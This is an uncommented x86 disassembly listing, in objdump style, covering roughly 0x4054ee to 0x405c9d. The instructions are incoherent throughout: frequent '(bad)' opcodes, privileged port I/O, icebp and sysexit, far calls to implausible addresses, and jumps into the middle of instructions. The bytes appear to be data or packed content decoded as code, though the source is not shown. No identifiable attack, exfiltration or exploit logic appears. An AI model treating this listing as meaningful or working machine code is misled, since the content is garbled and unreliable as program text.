  4054ee:	lods   al,BYTE PTR ds:[esi]
  4054ef:	mov    esi,0xe9870008
  4054f4:	dec    esp
  4054f5:	(bad)  
  4054f6:	out    0x32,eax
  4054f8:	and    eax,DWORD PTR [esp+ebp*2]
  4054fb:	outs   dx,DWORD PTR ds:[esi]
  4054fc:	xchg   ebp,eax
  4054fd:	push   eax
  4054fe:	xor    DWORD PTR [edx+0x4ae90009],0x32e9ff96
  405508:	xchg   esi,eax
  405509:	jne    0x4054fc
  40550b:	call   0xc2c0:0x32e9c94f
  405512:	in     eax,0x32
  405514:	cmp    al,0x8b
  405516:	aad    0xb2
  405518:	int    0xac
  40551a:	push   ss
  40551b:	add    cl,dh
  40551d:	inc    ebp
  40551e:	test   DWORD PTR ds:0xe90009,esi
  405524:	jecxz  0x4054d9
  405526:	push   0xff96a2e9
  40552b:	xchg   ecx,eax
  40552c:	aas    
  40552d:	mov    ch,0xff
  40552f:	xchg   esi,eax
  405530:	lods   al,BYTE PTR ds:[esi]
  405531:	dec    esp
  405532:	rol    BYTE PTR [ecx],0x2d
  405535:	stc    
  405536:	(bad)  
  405537:	call   0x7f1c7616
  40553c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40553d:	add    BYTE PTR [ebp+0x31],0x4d
  405541:	or     DWORD PTR [eax],edx
  405543:	jmp    0x459cf67a
  405548:	into   
  405549:	xchg   esi,eax
  40554a:	mov    DWORD PTR [esi+eax*1-0x3d2827c],esp
  405551:	aam    0xff
  405553:	call   0x1002f8a
  405558:	or     esp,DWORD PTR [ebx]
  40555a:	mov    DWORD PTR [ebp+0xc],0x48ffffa9
  405561:	ja     0x4055d8
  405563:	rcl    bh,0x3f
  405566:	aam    0xff
  405568:	int    0x31
  40556a:	pop    DWORD PTR [ebp+0x48]
  40556d:	into   
  40556e:	inc    ebp
  40556f:	fadd   DWORD PTR [edi+0x6]
  405572:	add    BYTE PTR [eax],al
  405574:	dec    edi
  405575:	inc    eax
  405576:	hlt    
  405577:	inc    DWORD PTR [edi]
  405579:	or     al,BYTE PTR [eax]
  40557b:	(bad)  
  40557c:	int    0xcd
  40557e:	push   eax
  40557f:	push   0x80000a08
  405584:	mov    dl,0x9
  405586:	push   DWORD PTR [ebp+0x0]
  405589:	loopne 0x4055ec
  40558b:	push   0xffffffc8
  40558d:	fmul   DWORD PTR [ecx]
  40558f:	or     eax,eax
  405591:	jl     0x4055a2
  405593:	cmp    DWORD PTR [ebp-0x64],0x9
  405597:	jne    0x40559e
  405599:	loope  0x405603
  40559b:	add    BYTE PTR [eax],al
  40559d:	fmul   st,st(6)
  40559f:	inc    ebp
  4055a0:	mov    al,0x87
  4055a2:	push   es
  4055a3:	add    BYTE PTR [eax],al
  4055a5:	push   ebp
  4055a6:	inc    ecx
  4055a7:	mov    al,0x50
  4055a9:	xlat   BYTE PTR ds:[ebx]
  4055aa:	lock mov ebx,0x99868
  4055b0:	adc    BYTE PTR ds:0xb050c441,0x40
  4055b7:	enter  0x9800,0x2
  4055bb:	shl    BYTE PTR [ebp-0x73],0x64
  4055bf:	fadd   DWORD PTR [eax]
  4055c1:	mov    BYTE PTR [ecx],cl
  4055c3:	mov    eax,DWORD PTR [ebp+0x40]
  4055c6:	int3   
  4055c7:	add    BYTE PTR [eax],al
  4055c9:	in     eax,0xe8
  4055cb:	ret    
  4055cc:	mov    ecx,0xd44
  4055d1:	xor    ebx,esi
  4055d3:	ret    
  4055d4:	repz mov ebp,esi
  4055d7:	inc    edi
  4055d8:	les    ecx,FWORD PTR ds:0x460003a0
  4055de:	pop    esp
  4055df:	pop    ebx
  4055e0:	(bad)  
  4055e1:	hlt    
  4055e2:	iret   
  4055e3:	lds    eax,FWORD PTR [ebp+0x59]
  4055e6:	out    0xd,al
  4055e8:	add    BYTE PTR [ecx],dh
  4055ea:	jecxz  0x405633
  4055ec:	hlt    
  4055ed:	add    BYTE PTR [esi],ah
  4055ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4055f0:	add    eax,DWORD PTR [eax]
  4055f2:	lods   al,BYTE PTR ds:[esi]
  4055f3:	gs (bad) 
  4055f5:	push   eax
  4055f6:	mov    esp,DWORD PTR [edx+0x160e0029]
  4055fc:	pop    edi
  4055fd:	call   0x43420a
  405602:	sub    ah,dl
  405604:	push   ss
  405605:	push   es
  405606:	mov    dl,0x25
  405608:	mov    bh,0x0
  40560a:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  40560c:	stos   BYTE PTR es:[edi],al
  40560d:	mov    WORD PTR [ecx],?
  40560f:	mov    ds:0x9264ff03,al
  405614:	pushf  
  405615:	jne    0x405608
  405617:	ret    
  405618:	pop    ss
  405619:	mov    eax,0x414ddf59
  40561e:	xor    DWORD PTR [ebx+0x17],edx
  405621:	mov    esp,0xc524c9
  405626:	xor    DWORD PTR [edi],ebx
  405628:	enter  0x3e14,0x33
  40562c:	inc    edi
  40562d:	fadd   QWORD PTR [ecx]
  40562f:	clc    
  405630:	add    edi,edi
  405632:	and    al,0x62
  405634:	lods   al,BYTE PTR ds:[esi]
  405635:	sti    
  405636:	cdq    
  405637:	sbb    DWORD PTR [ebp+0x195710b],0xffffffeb
  40563e:	out    0x18,eax
  405640:	inc    edi
  405641:	mov    ah,0x7e
  405643:	xchg   ebp,eax
  405644:	push   edi
  405645:	call   0xffdd7b1a
  40564a:	outs   dx,BYTE PTR ds:[esi]
  40564b:	or     esp,ebx
  40564d:	pop    edi
  40564e:	pop    ecx
  40564f:	cld    
  405650:	es add al,0x0
  405653:	xor    DWORD PTR [ecx],edi
  405655:	push   esi
  405656:	pop    ss
  405657:	xchg   ebp,eax
  405658:	xchg   esp,eax
  405659:	aam    0x57
  40565b:	pop    ecx
  40565c:	das    
  40565d:	inc    eax
  40565e:	popf   
  40565f:	inc    esi
  405660:	add    BYTE PTR [ecx],ch
  405662:	pop    ss
  405663:	xor    esp,DWORD PTR [eax-0x74b7f08]
  405669:	call   0x9cd49b85
  40566e:	repz daa 
  405670:	push   ds
  405671:	in     eax,dx
  405672:	pushf  
  405673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405674:	pop    ebp
  405675:	add    DWORD PTR [eax+ebx*1-0x6c],eax
  405679:	push   cs
  40567a:	or     ecx,esi
  40567c:	sbb    eax,0x801ea8eb
  405681:	and    DWORD PTR [ecx],ecx
  405683:	ficomp DWORD PTR [eax+ebx*8]
  405686:	mov    gs,WORD PTR [ebp+eiz*2-0x67]
  40568a:	pushf  
  40568b:	fs std 
  40568d:	in     eax,0x16
  40568f:	popf   
  405690:	mov    al,ds:0x93de9900
  405695:	bound  edi,QWORD PTR [ebx-0x546ae22a]
  40569b:	xchg   edi,eax
  40569c:	retf   
  40569d:	jmp    0xa95e1ca5
  4056a2:	stos   DWORD PTR es:[edi],eax
  4056a3:	iret   
  4056a4:	scas   al,BYTE PTR es:[edi]
  4056a5:	mov    dh,0x9c
  4056a7:	mov    dh,0x1d
  4056a9:	ins    DWORD PTR es:[edi],dx
  4056aa:	stos   DWORD PTR es:[edi],eax
  4056ab:	xchg   edi,eax
  4056ac:	scas   al,BYTE PTR es:[edi]
  4056ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056ae:	pushf  
  4056af:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4056b0:	sbb    eax,0xae7fab61
  4056b5:	xchg   esi,eax
  4056b6:	pushf  
  4056b7:	add    BYTE PTR [edx+0x5033d15],dh
  4056bd:	add    DWORD PTR [esi-0x665f2aea],eax
  4056c3:	mov    ecx,0x6200937e
  4056c8:	jno    0x4056f9
  4056ca:	pop    edi
  4056cb:	mov    al,ds:0xbbfff870
  4056d0:	mov    ecx,0xba2583a4
  4056d5:	aaa    
  4056d6:	sub    esi,DWORD PTR [edx]
  4056d8:	mov    cl,0x15
  4056da:	or     al,0xe9
  4056dc:	es inc ebx
  4056de:	add    esp,0x42
  4056e1:	xchg   ebx,eax
  4056e2:	jae    0x405695
  4056e4:	scas   eax,DWORD PTR es:[edi]
  4056e5:	dec    ebp
  4056e6:	cld    
  4056e7:	cdq    
  4056e8:	xchg   ebp,eax
  4056e9:	sbb    eax,0xcb91410c
  4056ee:	add    cl,ch
  4056f0:	scas   eax,DWORD PTR es:[edi]
  4056f1:	leave  
  4056f2:	js     0x4056cd
  4056f4:	mov    ebp,0x3d010c1c
  4056f9:	mov    bh,0xff
  4056fb:	push   cs
  4056fc:	mov    ebx,0x1f06f84c
  405701:	xchg   ebp,eax
  405702:	call   0x4a4e94
  405707:	loop   0x4056fb
  405709:	sbb    eax,0xf944ee19
  40570e:	(bad)  
  40570f:	pop    esp
  405710:	lds    edi,FWORD PTR [ecx]
  405712:	call   DWORD PTR [ebp+ebp*1-0x5f]
  405716:	add    edx,edi
  405718:	mov    edx,0xb18b92
  40571d:	stos   BYTE PTR es:[edi],al
  40571e:	sbb    al,0xfc
  405720:	rol    DWORD PTR [eax],1
  405722:	int3   
  405723:	add    cl,ch
  405725:	fwait
  405726:	sbb    al,0xc
  405728:	rol    DWORD PTR [eax],0xbd
  40572b:	jmp    FWORD PTR [esi-0x4fa43942]
  405731:	outs   dx,DWORD PTR ds:[esi]
  405732:	add    eax,0xa5ae3400
  405737:	sub    DWORD PTR [ebp-0x71006cc3],0x728cb8
  405741:	scas   al,BYTE PTR es:[edi]
  405742:	outs   dx,BYTE PTR ds:[esi]
  405743:	call   DWORD PTR [eax+0x20]
  405746:	or     al,0x1
  405748:	add    BYTE PTR [eax+0x58c7185e],cl
  40574e:	push   es
  40574f:	leave  
  405750:	ret    
  405751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405752:	sub    esp,0xffffff83
  405755:	jge    0x405755
  405757:	push   DWORD PTR [ebx+0x5f]
  40575a:	mov    edi,DWORD PTR [ebp+0x10]
  40575d:	pop    eax
  40575e:	add    bl,BYTE PTR [ecx]
  405760:	inc    DWORD PTR [ebp+0x4075fea2]
  405766:	pop    esi
  405767:	(bad)  
  405769:	jmp    FWORD PTR [ebp-0x1]
  40576c:	jne    0x405776
  40576e:	outs   dx,DWORD PTR ds:[esi]
  40576f:	jne    0x40577d
  405771:	dec    edi
  405772:	clc    
  405773:	pop    es
  405774:	call   0x3fae90
  405779:	push   ecx
  40577a:	retf   
  40577b:	adc    BYTE PTR [eax],al
  40577d:	lds    eax,FWORD PTR [edx-0x52ff7c14]
  405783:	std    
  405784:	push   DWORD PTR [ebx-0x24]
  405787:	mov    bh,BYTE PTR [ebp+0xc]
  40578a:	or     BYTE PTR [edx],al
  40578c:	push   ss
  40578d:	jmp    DWORD PTR [ebp-0x6a]
  405790:	(bad)  
  405791:	jne    0x405773
  405793:	pop    ebp
  405794:	mov    bl,0xd6
  405796:	jmp    FWORD PTR [esi-0x1]
  405799:	jne    0x405767
  40579b:	outs   dx,BYTE PTR ds:[esi]
  40579c:	jne    0x4057a6
  40579e:	lock add edx,edi
  4057a1:	(bad)  
  4057a2:	out    dx,eax
  4057a3:	(bad)
  4057a7:	fmul   DWORD PTR [edx-0xfadb414]
  4057ad:	jmp    DWORD PTR [ebp+0x1]
  4057b0:	call   0xffaec6fa
  4057b5:	mov    DWORD PTR [ebp+0x1],edx
  4057b8:	cmp    DWORD PTR [ebp+0x31],0xffffffac
  4057bc:	add    esi,DWORD PTR [edi+eiz*8-0x7e]
  4057c0:	adc    BYTE PTR [ecx+ebx*4],cl
  4057c3:	sar    BYTE PTR [eax-0x3c698101],1
  4057c9:	je     0x4057be
  4057cb:	sub    al,0x40
  4057cd:	lock add DWORD PTR [ebx],esp
  4057d0:	adc    BYTE PTR [ecx+ebx*2],cl
  4057d3:	mov    bh,0xba
  4057d5:	call   FWORD PTR [esi-0x6a]
  4057d8:	ret    
  4057d9:	je     0x4057fe
  4057db:	and    DWORD PTR [eax],ebx
  4057dd:	cld    
  4057de:	xor    DWORD PTR [eax-0x3c000d],esp
  4057e4:	call   0xf80f:0xd23d0075
  4057eb:	dec    ecx
  4057ec:	(bad)  
  4057ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4057ee:	jmp    FWORD PTR [esi]
  4057f0:	lods   al,BYTE PTR ds:[esi]
  4057f1:	ret    
  4057f2:	jne    0x405834
  4057f4:	out    0xf,eax
  4057f6:	adc    BYTE PTR [esi],bl
  4057f8:	jbe    0x405791
  4057fa:	call   FWORD PTR [edx+edi*8+0xa397599]
  405801:	dec    edx
  405802:	inc    DWORD PTR [esi]
  405804:	or     BYTE PTR [eax-0x548cfebb],cl
  40580a:	(bad)  
  40580b:	(bad)  
  40580c:	xchg   edi,eax
  40580d:	cdq    
  40580e:	jmp    DWORD PTR [esi+ebp*4-0x55]
  405812:	xchg   BYTE PTR [eax],cl
  405814:	test   al,0x99
  405816:	leave  
  405817:	repz sahf 
  405819:	add    edx,DWORD PTR [ebp-0x56]
  40581c:	mov    BYTE PTR [ebp+0xfbfc1c4],0xc
  405823:	fldcw  WORD PTR [esi-0x46]
  405826:	(bad)  
  405827:	mov    esi,0xb20c3f19
  40582c:	aad    0x7
  40582e:	add    BYTE PTR ds:0x357598e7,ah
  405834:	or     DWORD PTR [ecx-0x616f80bc],edx
  40583a:	or     eax,0x86da1571
  40583f:	hlt    
  405840:	cwde   
  405841:	cmp    DWORD PTR [ecx-0x6e6f0304],ebx
  405847:	pop    edi
  405848:	nop
  405849:	jle    0x405858
  40584b:	add    BYTE PTR [ecx+0x15],dh
  40584e:	retf   0xec82
  405851:	mov    ecx,gs
  405853:	add    eax,DWORD PTR [ecx+0x9]
  405856:	(bad)  
  405858:	pop    edi
  405859:	push   ss
  40585a:	stc    
  40585b:	cwde   
  40585c:	fmul   QWORD PTR [esi+edx*2-0x2b6fb6f1]
  405863:	or     ebx,DWORD PTR [ecx-0x62]
  405866:	inc    edi
  405867:	cdq    
  405868:	ds jle 0x40580f
  40586b:	xchg   ebx,eax
  40586c:	loope  0x40580e
  40586e:	int    0xb8
  405870:	cs nop
  405872:	cs sysexit 
  405875:	mov    eax,ds:0x901ebacd
  40587a:	xor    dh,al
  40587c:	and    eax,0x1d8cbc09
  405881:	mov    WORD PTR ds:0x21e46294,fs
  405887:	cdq    
  405888:	test   BYTE PTR [ecx],al
  40588a:	adc    DWORD PTR [ecx],ebp
  40588c:	xlat   BYTE PTR ds:[ebx]
  40588d:	(bad)  
  40588e:	test   BYTE PTR [edx+0x176a0174],0x39
  405895:	or     DWORD PTR [ebp+0x42],ebx
  405898:	ficom  WORD PTR ds:0xadfaabf1
  40589e:	(bad)  
  40589f:	cwde   
  4058a0:	cmp    cl,cl
  4058a2:	push   ebp
  4058a3:	(bad)  
  4058a4:	mov    ch,0x45
  4058a6:	mov    ecx,0xf115be33
  4058ab:	stos   DWORD PTR es:[edi],eax
  4058ac:	mov    ds:0xb600ae,eax
  4058b1:	leave  
  4058b2:	add    eax,eax
  4058b4:	xor    eax,0xa57d888f
  4058b9:	xor    cl,BYTE PTR [ecx]
  4058bb:	adc    cl,ch
  4058bd:	cmp    eax,0xa91cfef9
  4058c2:	(bad)  
  4058c3:	jne    0x405856
  4058c5:	(bad)  
  4058c7:	loope  0x40584f
  4058c9:	cdq    
  4058ca:	add    eax,eax
  4058cc:	cmc    
  4058cd:	xor    ecx,DWORD PTR [ebp+ecx*4+0x2c]
  4058d1:	lds    edi,FWORD PTR [eax]
  4058d3:	call   0xffd002c1
  4058d8:	data16 das 
  4058da:	add    eax,ebp
  4058dc:	sub    DWORD PTR [edx+0x7562ff8f],ebx
  4058e2:	xor    ecx,ecx
  4058e4:	sub    eax,DWORD PTR [esi-0x71]
  4058e7:	push   esp
  4058e8:	jb     0x405880
  4058ea:	mov    esp,eax
  4058ec:	jne    0x405886
  4058ee:	(bad)  
  4058ef:	jmp    FWORD PTR [esi]
  4058f1:	scas   eax,DWORD PTR es:[edi]
  4058f2:	push   ecx
  4058f3:	(bad)  
  4058f4:	cs leave 
  4058f6:	or     DWORD PTR [eax],eax
  4058f8:	jmp    0xed85db2f
  4058fd:	and    eax,0xb2ec74c9
  405902:	sar    edi,1
  405904:	xchg   ebx,eax
  405905:	pop    es
  405906:	mov    ds:0x932e878,al
  40590b:	push   DWORD PTR [esi+ebp*1-0x5f]
  40590f:	fisttp QWORD PTR [edx]
  405911:	leave  
  405912:	mov    cs,WORD PTR [ebx]
  405914:	sub    DWORD PTR [eax],eax
  405916:	aaa    
  405917:	(bad)  
  405918:	(bad)  [bp+0x48]
  40591c:	add    dh,bl
  40591e:	inc    eax
  40591f:	std    
  405920:	out    0xf2,eax
  405922:	xchg   BYTE PTR [esi+0x2138c2ff],cl
  405928:	test   DWORD PTR [eax],0xff004407
  40592e:	std    
  40592f:	add    al,ch
  405931:	or     al,0xc4
  405933:	jbe    0x405934
  405935:	mov    DWORD PTR ds:0xd7fffe2d,ecx
  40593b:	fnstsw WORD PTR ds:0x8d0a8801
  405941:	test   edx,ebx
  405943:	ja     0x405944
  405945:	dec    DWORD PTR [eax+0x5d]
  405948:	test   al,bl
  40594a:	mov    bh,0x76
  40594c:	lea    eax,[ebp-0x8836]
  405952:	dec    eax
  405953:	jbe    0x40590a
  405955:	mov    eax,0xe8ff75d6
  40595a:	mov    esi,0xe10000ca
  40595f:	xchg   DWORD PTR [esi+edi*8+0xf4075e7],edi
  405966:	int3   
  405967:	xchg   edx,eax
  405968:	add    BYTE PTR [eax],al
  40596a:	dec    eax
  40596b:	adc    DWORD PTR [ebp-0x8a093e],0xff9a1af7
  405975:	call   FWORD PTR [eax]
  405977:	pop    es
  405978:	test   BYTE PTR [ebx+0xa0800],al
  40597e:	(bad)  
  40597f:	retf   0x4fa5
  405982:	push   0x414635
  405987:	xor    BYTE PTR [esi+0x30800c3],al
  40598d:	shl    BYTE PTR [ebp+0xd],0x5d
  405991:	int3   
  405992:	add    al,bl
  405994:	or     DWORD PTR [ebp-0x88e56b],ecx
  40599a:	jmp    DWORD PTR [ebp+0x48]
  40599d:	sub    al,0x50
  40599f:	and    BYTE PTR [esi+0x4f],0x41
  4059a3:	xor    DWORD PTR [eax-0x600d8d55],esp
  4059a9:	add    ecx,DWORD PTR [ebx]
  4059ab:	icebp  
  4059ac:	int3   
  4059ad:	add    cl,ch
  4059af:	xchg   BYTE PTR [edi-0x3351fffd],bl
  4059b5:	pop    es
  4059b6:	call   0xffd71d23
  4059bb:	sub    ah,BYTE PTR [eax+0x10]
  4059be:	wbinvd 
  4059c0:	ds dec ebx
  4059c2:	inc    ecx
  4059c3:	xor    DWORD PTR [edi+0x10],esi
  4059c6:	or     al,0x99
  4059c8:	idiv   BYTE PTR [edx+0x97a7eff]
  4059ce:	push   0x31
  4059d0:	movups xmm1,XMMWORD PTR [ecx+ebx*2]
  4059d4:	or     bh,BYTE PTR [ebx+0x702c66ff]
  4059da:	ret    0x265f
  4059dd:	xchg   esi,eax
  4059de:	lea    eax,[eax]
  4059e0:	add    edi,esp
  4059e2:	xor    DWORD PTR [eax+0x59],edx
  4059e5:	xchg   BYTE PTR [edx-0x69b0b901],bh
  4059eb:	jne    0x405a06
  4059ed:	inc    edi
  4059ee:	adc    BYTE PTR [esi+esi*1],dl
  4059f1:	push   esp
  4059f2:	repz dec edi
  4059f4:	cs dec esi
  4059f6:	or     ebp,eax
  4059f8:	and    ebp,ebx
  4059fa:	xchg   ebp,eax
  4059fb:	dec    DWORD PTR [ecx]
  4059fd:	aas    
  4059fe:	scas   al,BYTE PTR es:[edi]
  4059ff:	call   DWORD PTR [esi]
  405a01:	clc    
  405a02:	and    cl,BYTE PTR [ebp-0x7a73398d]
  405a08:	mov    ebp,0xb2ff95fc
  405a0d:	test   ebx,esi
  405a0f:	(bad)  
  405a10:	jge    0x4059b2
  405a12:	stos   BYTE PTR es:[edi],al
  405a13:	adc    ch,dh
  405a15:	or     eax,0xd69cfef3
  405a1a:	xchg   esp,eax
  405a1b:	(bad)  
  405a1c:	fimul  WORD PTR [ecx]
  405a1e:	ror    DWORD PTR [ebp+0x8e909f2],1
  405a24:	icebp  
  405a25:	adc    eax,0x41972c14
  405a2a:	sub    BYTE PTR [esi+edi*4],al
  405a2d:	push   ss
  405a2e:	cmc    
  405a2f:	stos   DWORD PTR es:[edi],eax
  405a30:	and    BYTE PTR [eax+0x56ae95be],dh
  405a36:	jge    0x4059ce
  405a38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a39:	mov    WORD PTR [ecx],ds
  405a3b:	lods   al,BYTE PTR ds:[esi]
  405a3c:	clc    
  405a3d:	scas   eax,DWORD PTR es:[edi]
  405a3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a3f:	xchg   ebp,eax
  405a40:	add    DWORD PTR [eax-0x71ff03e4],ecx
  405a46:	sbb    ch,ah
  405a48:	xchg   esp,eax
  405a49:	cld    
  405a4a:	hlt    
  405a4b:	cmp    BYTE PTR [ebp+0x2f860104],dl
  405a51:	sbb    DWORD PTR [eax-0xb1b6b13],esp
  405a57:	sbb    BYTE PTR [ebp+0x308100dc],dl
  405a5d:	pop    esp
  405a5e:	mov    WORD PTR [esi-0x54],fs
  405a61:	repz mov bl,0x5e
  405a64:	xchg   ebp,eax
  405a65:	mov    esp,0x46962b86
  405a6a:	mov    WORD PTR [ecx+0x474d8494],?
  405a70:	xchg   ebp,eax
  405a71:	mov    eax,ss:0x931c28f
  405a77:	ins    BYTE PTR es:[edi],dx
  405a78:	les    esi,FWORD PTR [esi]
  405a7a:	xchg   BYTE PTR [eax],bh
  405a7c:	xchg   esi,eax
  405a7d:	push   ds
  405a7e:	mov    WORD PTR [esi],fs
  405a80:	dec    edi
  405a81:	aad    0x8a
  405a83:	push   ds
  405a84:	xchg   ebp,eax
  405a85:	sbb    DWORD PTR [edx+0x2b],ebp
  405a88:	add    al,0x31
  405a8a:	mov    WORD PTR [esp+ebx*2-0x1],ss
  405a8e:	mov    eax,DWORD PTR [esi]
  405a90:	lods   al,BYTE PTR ds:[esi]
  405a91:	and    esi,DWORD PTR [esi+edi*8+0xc6f894]
  405a98:	fnsave [edx]
  405a9a:	ss mov edi,ebp
  405a9d:	or     BYTE PTR [ecx],cl
  405a9f:	call   FWORD PTR [ecx+eiz*8-0x76]
  405aa3:	jne    0x405a9e
  405aa5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aa6:	adc    eax,0x3700d60c
  405aab:	add    eax,ebp
  405aad:	push   cs
  405aae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405aaf:	mov    edi,edi
  405ab1:	mov    al,0xf0
  405ab3:	clc    
  405ab4:	call   DWORD PTR [ebx]
  405ab6:	mov    eax,0x393cff9c
  405abb:	mov    eax,ds:0x8bc59241
  405ac0:	or     ebp,DWORD PTR [ecx+0x14feeb26]
  405ac6:	test   DWORD PTR [ebx],edi
  405ac8:	call   0xffcc2373
  405acd:	cmp    DWORD PTR [ebp+edx*1-0xad879e8],esp
  405ad4:	dec    edi
  405ad5:	jle    0x405b16
  405ad7:	add    eax,ebp
  405ad9:	aaa    
  405ada:	mov    ebp,0x9d81ff8b
  405adf:	mov    dl,0xff
  405ae1:	imul   ax,si,0x14
  405ae5:	jmp    0x572cdb09
  405aea:	aaa    
  405aeb:	cmc    
  405aec:	(bad)  
  405aed:	aam    0x42
  405aef:	mov    dh,BYTE PTR [ebp-0xb]
  405af2:	or     bh,ch
  405af4:	(bad)  
  405af5:	mov    ah,0x3a
  405af7:	mov    eax,ds:0x8abd36b9
  405afc:	push   DWORD PTR [esi+ecx*1-0x42068a74]
  405b03:	adc    al,0xc
  405b05:	xchg   ebx,eax
  405b06:	adc    DWORD PTR [ebp+esi*2-0x9c251f],ecx
  405b0d:	push   cs
  405b0e:	add    BYTE PTR [ebp-0x2bff8a76],ah
  405b14:	jne    0x405b8b
  405b16:	adc    bh,ch
  405b18:	cld    
  405b19:	or     ebp,DWORD PTR [edx-0x4]
  405b1c:	jne    0x405b93
  405b1e:	or     BYTE PTR [eax],dh
  405b20:	sbb    edi,edi
  405b22:	dec    edi
  405b24:	dec    esp
  405b25:	ret    0xd810
  405b28:	ror    DWORD PTR [edx-0xf3ea414],1
  405b2e:	push   ebx
  405b2f:	push   es
  405b30:	into   
  405b31:	sub    bl,bl
  405b33:	inc    ebx
  405b34:	inc    eax
  405b35:	or     al,0xff
  405b37:	test   al,0x87
  405b39:	inc    ebp
  405b3a:	clc    
  405b3b:	fcomip st,st(0)
  405b3d:	pop    es
  405b3e:	(bad)  
  405b3f:	push   ebp
  405b40:	jns    0x405b09
  405b42:	inc    ebp
  405b43:	mov    ah,0x5
  405b45:	add    BYTE PTR [eax],al
  405b47:	cwde   
  405b48:	cmp    DWORD PTR ds:0x4453ac,0x0
  405b4f:	and    al,0xd9
  405b51:	cmp    BYTE PTR [ebp-0x80],0x6
  405b55:	je     0x405bad
  405b57:	fnstsw WORD PTR [edi]
  405b59:	lock push eax
  405b5b:	xor    al,BYTE PTR [edx+ebp*2]
  405b5e:	add    BYTE PTR [edx],dh
  405b60:	add    eax,0x6587d83
  405b65:	je     0x405b6c
  405b67:	out    dx,eax
  405b68:	out    dx,eax
  405b69:	por    mm3,QWORD PTR [edx-0x14]
  405b6d:	jmp    FWORD PTR [ecx+0x48]
  405b70:	mov    DWORD PTR [ebp-0x8],eax
  405b73:	add    BYTE PTR [eax-0x1c53ea89],bl
  405b79:	inc    esp
  405b7a:	add    BYTE PTR [ebx],cl
  405b7c:	pop    eax
  405b7d:	icebp  
  405b7e:	cs or  ebp,0x71
  405b82:	add    BYTE PTR [ecx+eax*1+0xb],dh
  405b86:	inc    ebp
  405b87:	or     al,0x83
  405b89:	dec    eax
  405b8a:	lock cmp esi,DWORD PTR [ecx]
  405b8d:	test   al,0x1a
  405b8f:	pop    ss
  405b90:	jb     0x405b8e
  405b92:	jle    0x405c09
  405b94:	std    
  405b95:	push   ss
  405b96:	adc    DWORD PTR [eax],ecx
  405b98:	mov    edx,0x33e3935c
  405b9d:	(bad)  
  405b9e:	mov    esi,DWORD PTR [si-0x54]
  405ba2:	xchg   edx,eax
  405ba3:	jne    0x405b86
  405ba5:	adc    al,BYTE PTR [ebx]
  405ba7:	inc    DWORD PTR [esp+esi*4-0x65]
  405bab:	out    0xf1,al
  405bad:	lahf   
  405bae:	add    ecx,DWORD PTR [ebx+0x5b31daf2]
  405bb4:	call   0x6405b16
  405bb9:	pop    ss
  405bba:	lahf   
  405bbb:	sub    DWORD PTR [ebp+0x53],0x36
  405bbf:	push   esi
  405bc0:	push   es
  405bc1:	dec    eax
  405bc2:	dec    ebx
  405bc3:	push   eax
  405bc4:	lock lahf 
  405bc6:	fwait
  405bc7:	ins    BYTE PTR es:[edi],dx
  405bc8:	jo     0x405b69
  405bca:	add    ecx,DWORD PTR [ebx-0x3b7a597]
  405bd0:	xor    DWORD PTR [eax+0x602a0003],esp
  405bd6:	pop    ss
  405bd7:	ds add cl,bl
  405bda:	dec    esi
  405bdb:	xor    eax,DWORD PTR [ecx+0x31]
  405bde:	out    dx,eax
  405bdf:	fwait
  405be0:	hlt    
  405be1:	jno    0x405b82
  405be3:	add    ecx,DWORD PTR [ebx]
  405be5:	jno    0x405b92
  405be7:	loop   0x405b73
  405be9:	inc    ecx
  405bea:	mov    bh,0x37
  405bec:	push   eax
  405bed:	lock lahf 
  405bef:	ss call 0x433b47
  405bf5:	sub    ah,al
  405bf7:	push   ss
  405bf8:	push   ds
  405bf9:	mov    edx,0x25457fca
  405bfe:	mov    ds:0x72f1ec9b,eax
  405c03:	add    edx,DWORD PTR [eax+0x16]
  405c06:	or     bh,BYTE PTR [esi]
  405c08:	xchg   BYTE PTR [ebp+eax*4-0x3ec4e817],cl
  405c0f:	call   0xae498d17
  405c14:	xor    DWORD PTR [edx+0x52],ebx
  405c17:	sub    cl,BYTE PTR [ebx+0x31]
  405c1a:	or     ecx,ebp
  405c1c:	add    eax,DWORD PTR [esi-0xd436e19]
  405c22:	fisub  WORD PTR [ecx-0x61]
  405c25:	mov    dl,0x4d
  405c27:	fld    DWORD PTR [ebp+0x4331f10c]
  405c2d:	xor    DWORD PTR [ecx],ecx
  405c2f:	pop    ebp
  405c30:	div    BYTE PTR [ebx+0x703d3d46]
  405c36:	or     ecx,ebp
  405c38:	pop    ss
  405c39:	cmp    BYTE PTR [esp+edi*8-0x3605ffed],cl
  405c40:	call   0x71508048
  405c45:	add    esi,DWORD PTR [ecx]
  405c47:	or     ecx,ebp
  405c49:	mov    edx,0x8e249672
  405c4e:	outs   dx,DWORD PTR ds:[esi]
  405c4f:	or     ecx,ebp
  405c51:	leave  
  405c52:	icebp  
  405c53:	or     ecx,ebp
  405c55:	leave  
  405c56:	icebp  
  405c57:	or     ch,cl
  405c59:	leave  
  405c5a:	icebp  
  405c5b:	or     ebp,ecx
  405c5d:	leave  
  405c5e:	icebp  
  405c5f:	or     al,0xe9
  405c61:	leave  
  405c62:	icebp  
  405c63:	or     eax,0x7cec7ee4
  405c68:	mov    ecx,0xe8f3311d
  405c6d:	sbb    eax,0x1de8f331
  405c72:	xor    ebx,esi
  405c74:	call   0xe94b6d94
  405c79:	add    ebx,DWORD PTR [ebx-0x4bfa2cd7]
  405c7f:	int    0xff
  405c81:	xor    ah,BYTE PTR [ebp-0x78]
  405c84:	adc    eax,0xffca55c1
  405c89:	icebp  
  405c8a:	repnz std 
  405c8c:	add    DWORD PTR [eax],esi
  405c8e:	in     al,dx
  405c8f:	dec    edi
  405c90:	inc    ebp
  405c91:	sbb    DWORD PTR ds:0x77e90009,esi
  405c97:	into   
  405c98:	out    dx,eax
  405c99:	cdq    
  405c9a:	sar    ebp,0xf3
  405c9d:	xchg   ebx,eax
